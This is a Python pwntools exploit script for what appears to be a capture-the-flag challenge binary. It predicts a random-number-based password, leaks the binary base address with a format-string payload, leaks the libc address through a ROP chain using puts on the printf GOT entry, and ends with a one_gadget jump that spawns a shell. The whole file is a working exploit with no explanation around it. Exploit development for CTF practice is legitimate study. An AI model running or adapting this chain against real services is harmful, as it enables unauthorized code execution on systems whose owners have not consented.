#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *AdminMenu+188
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chal_patched'
elf = context.binary = ELF(exe)
libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Step 1 --- Crack password

io.recvuntil(b"your ticketID ")

a = int(io.recvline(keepends=False))

io.sendline(b"1")
io.recvuntil(b"your new ticketID is ")
b = int(io.recvline(False))


def crack_password(a, b):
    with process(["./crack_rand"]) as cracker:
        cracker.sendline(f"{a} {b}".encode())

        return int(cracker.recvline(False))


print(f"a, b: {a} {b}")
password = crack_password(a, b)
print(f"password: {password}")

# Step 2 --- Leak binary address

io.sendline(b"2")
io.sendline(str(password).encode())

io.sendline(b"1")
io.sendline(b"%9$p")

io.recvline_contains(b"Password changed to")
elf.address = int(io.recvuntil(b"=", drop=True), 16) - \
    (elf.symbols["ServiceLogin"]+71)
print(f"Base address: {hex(elf.address)}")

io.sendline(b"2")
io.sendline(b"0")

# Step 3 --- Leak libc address and jump back to AdminMenu

rop = ROP(elf)
rop.raw(b"AAAAAAAA")
rop.raw(b"BBBBBBBB")
rop.call(elf.plt["puts"], (elf.got["printf"], ))  # leak libc address
rop.call(elf.symbols["AdminMenu"])

print(rop.dump())

io.sendline(b"1")
io.sendline(rop.chain())

io.recvuntil(b"AAAA")
libc.address = unpack(io.recvn(6) + b"\x00\x00") - libc.symbols["printf"]
print(f"Libc address: {hex(libc.address)}")

# Step 4 --- Jump to one_gadget

io.sendline(b"1")
io.sendline(flat(
    b"AAAAAAAA",
    b"BBBBBBBB",
    libc.address + 0xe3b01  # one_gadget
))

io.interactive()
